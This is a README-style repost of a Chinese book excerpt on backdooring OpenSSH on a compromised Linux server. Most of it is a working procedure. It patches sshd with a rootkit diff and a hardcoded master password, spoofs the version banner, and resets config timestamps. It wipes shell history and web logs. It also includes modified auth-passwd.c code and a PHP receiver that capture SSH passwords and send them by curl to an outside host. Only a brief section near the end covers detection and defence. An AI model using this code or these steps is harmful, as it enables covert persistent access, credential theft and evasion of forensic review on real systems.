# openssh-backdoor

--with-ssl-dir=PATH 


 
 ./configure --prefix=/opt/ssh --sysconfdir=/opt/ssh/etc --with-ssl-dir=PATH 
 https://www.linuxfromscratch.org/blfs/view/7.9/postlfs/openssh.html
 
 ./config --prefix=/root/openssl-1.0.1u/bin no-asm  -fPIC no-shared
make
make install



Linux OpenSSH后门的添加与防范

博文视点 2017-02-09 10:41:00  2349  收藏 3
分类专栏： 黑客 文章标签： 黑客 linux Linux OpenSSH
版权
引言：相对于Windows，Linux操作系统的密码较难获取。不过很多Linux服务器配置了OpenSSH服务，在获取root权限的情况下，可以通过修改或者更新OpenSSH代码等方法，截取并保存其SSH登录账号和密码，甚至可以留下一个隐形的后门，达到长期控制Linux服务器的目的。 
很多入侵者在攻破一个Linux系统后，都会在系统中留下后门，用OpenSSH留后门是入侵者的惯用方式之一。OpenSSH后门比较难检测，本文选自《黑客攻防：实战加密与解密》将与您一起探讨如何添加及防范OpenSSH后门。

1 OpenSSH简介
　　OpenSSH是SSH（Secure Shell）协议的免费开源实现。很多人误认为OpenSSH与OpenSSL有关联，但实际上这两个计划有不同的目的和不同的发展团队，名称相近只是因为两者有同样的发展目标──提供开放源代码的加密通信软件。 
OpenSSH是OpenBSD的子计划，其官方网站地址为http://www.openssh.com/。OpenSSH的各个版本可以到其官网下载。 
　　SSH协议族可以用来进行远程控制，或者在计算机之间传送文件。而实现此功能的传统方式，如Telnet（终端仿真协议）、RCP、FTP、Rlogin、RSH，都是极不安全的，并且会使用明文传送密码。OpenSSH提供了服务端后台程序和客户端工具，用来加密远程控件和文件传输过程中的数据，并由此来代替原来的类似服务。OpenSSH是通过计算机网络使用SSH加密通信的实现，是取代由SSH Communications Security提供的商用版本的开放源代码方案。在OpenSSH服务中，sshd是一个典型的独立守护进程，OpenSSH服务可以通过“/etc/ssh/sshd_config”文件进行配置。OpenSSH支持SSH协议的1.3、1.5和2版本。自OpenSSH 2.9发布以来，默认的协议是版本2。

2 准备工作
01 下载openssh-5.9p1.tar.gz
　　openssh-5.9p1.tar.gz的下载地址为http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gz。

02 下载后门文件
　　后门文件下载地址为http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1. patch.tar.gz。

03 准备Linux虚拟机
　　准备Linux虚拟机Centos 6.4。

04 查看SSH当前版本信息
　　目前网上支持的SSH后门版本为5.9以下。如下图，使用“ssh -V”命令获取的OpenSSH版本信息为“OpenSSH_5.3p1, OpenSSL 1.0.0-fips 29 Mar 2010”。 

　　笔者未对高于5.9版本的SSH进行测试，但因为在Patch中可以直接修改banner的值，所以这在理论上是可行的。

注意：一定要将这里的版本号记录下来，以便在编译时将该信息进行伪装。

05 备份SSH原始配置文件
　　如图，将ssh_config和sshd_config分别备份为ssh_config.old和sshd_config.old。在Linux终端分别执行如下文件备份命令。



mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
 
mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
06 解压SSH后门
　　将sshbd.tgz下载到本地并解压 

　　执行以下命令。

tar zxvf sshbd.tgz
cd openssh
　　如果使用官方安装包openssh-5.9p1进行安装，可以执行以下命令。

tar zxf openssh-5.9p1.tar
tar zxf openssh-5.9p1.path.tar
cp openssh-5.9p1.patch/sshbd5.9p1.diff /openssh-5.9p1
cd openssh-5.9p1
patch < sshbd5.9p1.diff
3 设置SSH后门的登录密码及其密码记录位置
　　在OpenSSH目录中找到includes.h文件，运行“vi includes.h”命令修改“define _SECRET_PASSWD”为我们的登录密码，如图。 

　　默认密码记录日志文件保存在“/usr/local/share/0wn”目录下的slog和clog文件中。假设密码为“995430aaa”，代码如下。

define _SECRET_PASSWD  " 995430aaa"
4 安装并编译后门
01 编译和安装
　　运行如下代码。

 ./configure –prefix=/usr –sysconfdir=/etc/ssh
 make && make install
　　openssh-5.9p1需要使用下面的命令进行配置。

./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
　　在编译过程中可能会出现“configure: error: * zlib.h missing – please install first or check config.log”错误。此时，执行“yum install zlib-devel”和“yum install openssl openssl-devel”命令，安装后再次进行编译即可。

02 重启SSHD服务
　　执行“/etc/init.d/sshd restart”命令，重启SSHD服务。

03 还原新配置文件为旧配置文件的时间
　　执行以下命令，使ssh_config和sshd_config文件的修改时间与ssh_config.old和sshd_config.old文件一致。

touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config
touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config
mtime(modify time)：最后一次修改文件或目录的时间。
ctime(chang time)：最后一次改变文件或目录（改变的是原数据，即属性）的时间，如该文件的inode节点被修改的时间。touch命令除了“-d”和“-t”选项外，都会改变该时间。chmod、chown等命令也能改变该值。
atime(access time)：最后一次访问文件或目录的时间。
ls -l file：查看文件修改时间。
ls -lc file：查看文件状态改动时间。
ls -lu file：查看文件访问时间。
stat file：文件时间的3个属性。
5 登录后门并查看记录的密码文件
　　使用“ssh -l root IP”命令登录服务器，如“ssh -l root 192.168.52.175”。可以使用root的密码，也可以使用后门设置的密码“995430aaa”进行登录。然后，访问“/usr/local/ share/0wn”目录，查看其记录的密码日志文件clog和slog，如下图可以看到SSH登录和本地root账号登录的密码。

　　在实际测试过程中，还需要清除Apache日志。可供参考的日志清除命令如下。

export HISTFILE=/dev/null
export HISTSIZE=0
cd /etc/httpd/logs/
sed -i ‘/192.168.52.175/d’ access_log*
echo >/root/.bash_history      //清空操作日志
6 拓展密码记录方式
　　前面记录的密码只能在Linux服务器上面看，也就是说，用户必须拥有读取文件的权限，如果没有权限则无法登录服务器。在这里，最好的方法是记录的用户、密码和端口可以通过邮件或者HTTP直接发送到接收端（与黑产收信类似）。下面介绍具体实现方法。

01 接收端ssh.php代码
<?php
$username = $_POST['username'];
$password = $_POST['password'];
$host = $_POST['host'];
$port = $_POST['port'];
$time=date('Y-m-d H:i:s',time());
 if(isset($username) != "" || isset($password) !="" || isset($host) != "")
{
        $fp = fopen("sshlog.txt","a+");
        $result = "sername:.$username--->:Password:$password----->:Host:$host ----->:port:$port----->:time:$time";
        fwrite($fp,$result);
        fwrite($fp,"\r\n");
        fclose($fp);
}
?>
02 修改auth-passwd.c文件的内容
int
userauth_passwd(Authctxt *authctxt)
{
    static int attempt = 0;
    char prompt[150];
    char *password;
    char *pass[200];
    char szres[1024] = {0};
    FILE *f;
    char *findport()
    {
        FILE *FTopen;
        char tempBuf[1024] = {0};
        char *Filename = "/etc/ssh/sshd_config";
        char *Filetext = "Port";
        if((FTopen = fopen(Filename, "r")) == NULL) { return Filetext; }
        while(fgets(tempBuf, 1024, FTopen) != NULL) { 
                if(strstr(tempBuf, Filetext)) { Filetext = tempBuf; break; }
                memset(tempBuf, 0, 1024);
        }
        fclose(FTopen);
        return Filetext;
    }
 
    const char *host = options.host_key_alias ?  options.host_key_alias :
        authctxt->host;
 
    if (attempt++ >= options.number_of_password_prompts)
        return 0;
 
    if (attempt != 1)
        error("Permission denied, please try again.");
 
    snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
        authctxt->server_user, host);
    password = read_passphrase(prompt, 0);
    strcpy(pass,password);   //截取密码的时候把它复制到自定义的地方，以便调用
    packet_start(SSH2_MSG_USERAUTH_REQUEST);
    packet_put_cstring(authctxt->server_user);
    packet_put_cstring(authctxt->service);
    packet_put_cstring(authctxt->method->name);
    packet_put_char(0);
    packet_put_cstring(password);
    memset(password, 0, strlen(password));
    xfree(password);
    packet_add_padding(64);
    packet_send();
 
    dispatch_set(SSH2_MSG_USERAUTH_PASSWD_CHANGEREQ,
&input_userauth_passwd_changereq);
 
    if((f=fopen("/tmp/olog","a+"))!=NULL){ 
        fprintf(f,"username:%s-->password:%s-->host:%s-->port:%s\n", authctxt->server_user,pass,authctxt->host,findport());
        fclose(f);}  
 
    memset(szres,0,sizeof(szres));
    snprintf(szres,sizeof(szres),"/usr/bin/curl -s -d \"username=%s&password=
%s&host=%s&port=%s\" http://www.antian365.com/ssh.php >/dev/null",authctxt-> server_user,pass, authctxt->host,findport());
    system(szres);  
        return 1;
}
　　重新编译，执行后会自动将密码发送到服务器。但笔者在实际测试中并没有达到这样的效果，相关信息请读者访问http://0cx.cc/ssh_get_password.jspx查看并验证。

7 OpenSSH后门的防范方法
　　OpenSSH后门的防范方法如下。

重装OpenSSH软件，更新至最新版本7.2。
将SSH默认登录端口22更改为其他端口。
在IPTable中添加SSH访问策略。
查看命令历史记录，对可疑文件进行清理。在有条件的情况下，可重做系统。
修改服务器所有用户的密码为新的强健密码。
运行“ps aux | grep sshd”命令获取可疑进程的PID，运行“strace -o aa -ff -p PID”命令进行跟踪，成功登录SSH后，在当前目录下就生成了strace命令的输出。使用“grep open aa* | grep -v -e No -e null -e denied| grep WR”命令查看记录文件。在上面的命令中，过滤错误信息、/dev/null信息和拒绝（denied）信息，找出打开了读写模式（WR）的文件（因为要把记录的密码写入文件）。可以找到以读写方式记录在文件中的SSH后门密码文件的位置，并通过该方法判断是否存在SSH后门。当然，也有不记录密码，而仅仅留下一个万能SSH后门的情况。

8 小结
　　获取Linux的版本及其信息，命令如下。

cat /etc/issue
uname –ar
　　获取SSH版本的信息并记录，命令如下。

ssh -V >ssh.txt
　　下载OpenSSH客户端及后门程序，命令如下。网上还有一个版本sshd.tar.gz。

wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gz
wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
备份SSH配置文件，命令如下。

mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
　　安装必备软件，命令如下。

yum install -y openssl openssl-devel pam-devel zlib zlib-devel
　　解压并安装补丁，命令如下。

tar zxf openssh-5.9p1.tar.gz
tar zxf openssh-5.9p1.tar.gz
cp openssh-5.9p1.patch/sshbd5.9p1.diff  /openssh-5.9p1
cd openssh-5.9p1
patch < sshbd5.9p1.diff
　　修改includes.h文件中记录用户名和密码的文件位置及其密码，命令如下。

#define ILOG "/tmp/ilog"            //记录登录本机的用户名和密码
#define OLOG "/tmp/olog"            //记录本机登录远程的用户名和密码
#define SECRETPW "123456654321"     //后门的密码
　　修改version.h文件，使其修改后的版本信息为原始版本，命令如下。

#define SSH_VERSION "填入之前记下来的版本号,伪装原版本"
#define SSH_PORTABLE "小版本号"
　　安装并编译，命令如下。

./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
make clean
make && make install
service sshd restart 
　　恢复新配置文件的日期，使其与旧文件的日期一致。对ssh_config和sshd_config文件的内容进行对比，使其配置文件一致，然后修改文件日期。

touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config
touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config
　　清除操作日志，代码如下。

export HISTFILE=/dev/null
export HISTSIZE=0
cd /etc/httpd/logs/
sed -i ‘/192.168.52.175/d’ access_log*
echo >/root/.bash_history //清空操作日志
　　本文选自《黑客攻防：实战加密与解密》，点此链接可在博文视点官网查看此书。


————————————————
版权声明：本文为CSDN博主「博文视点」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/broadview2006/article/details/54944610
